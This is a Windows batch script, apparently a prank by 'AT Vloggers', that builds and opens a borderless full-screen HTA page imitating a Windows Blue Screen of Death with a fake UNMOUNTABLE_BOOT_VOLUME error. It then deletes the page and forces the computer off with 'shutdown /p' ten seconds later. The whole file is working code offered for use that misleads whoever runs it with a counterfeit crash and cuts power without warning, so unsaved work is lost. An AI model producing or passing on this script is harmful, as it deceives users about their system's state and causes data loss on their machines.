@echo off

REM By: Aidan Biggs
REM AKA AT Vloggers
REM
REM Please do not claim this as your own.
REM
REM If you remove this it means you break the Code of Use found here: 
REM https://at-vloggers.weebly.com/code-of-use.html

echo ^<!-- >BSOD.hta
echo By: Aidan Biggs >>BSOD.hta
echo AKA AT Vloggers >>BSOD.hta
echo. >>BSOD.hta
echo Please do not claim this as your own >>BSOD.hta
echo. >>BSOD.hta
echo If you remove this it means you break the Code of Use found here: >>BSOD.hta
echo https://at-vloggers.weebly.com/code-of-use.html >>BSOD.hta
echo --^> >>BSOD.hta
echo ^<html^> >>BSOD.hta
echo ^<title^>Test App^</title^> >>BSOD.hta
echo ^<hta:application >>BSOD.hta
echo maximizebutton="no" >>BSOD.hta
echo minimizebutton="no" >>BSOD.hta
echo sysmenu="no" >>BSOD.hta
echo Caption="no" >>BSOD.hta
echo windowstate="maximize"/^> >>BSOD.hta
echo ^<body bgcolor="blue" scroll="no"^> >>BSOD.hta
echo ^<font face="Lucida Console" size="20" color="white"^> >>BSOD.hta
echo A problem has been detected and Windows has been shut down to prevent damage to your computer.^<br^>^<br^> >>BSOD.hta
echo UNMOUNTABLE_BOOT_VOLUME^<br^>^<br^> >>BSOD.hta
echo If this is the first time you've seen this error screen, restart your computer. If this screen appears again, follow these steps:^<br^>^<br^> >>BSOD.hta
echo Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.^<br^>^<br^> >>BSOD.hta
echo If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^<br^>^<br^> >>BSOD.hta
echo Technical Information:^<br^>^<br^> >>BSOD.hta
echo ^</font^> >>BSOD.hta
echo ^<font face="Lucida Console" size="6" color="white"^> >>BSOD.hta
echo *** MEMORY / DRIVE STOP: 0x000000ED (0x80F128D0, 0xc000009c, 0x00000000, 0x00000000) ***^<br^> >>BSOD.hta
echo TURNING OF THIS PC IN 10 SECONDS >>BSOD.hta
echo ^</font^> >>BSOD.hta
echo ^</body^> >>BSOD.hta
echo ^</html^> >>BSOD.hta
start BSOD.hta
timeout 0 >nul
del /F BSOD.hta
timeout 10 >nul
shutdown /p
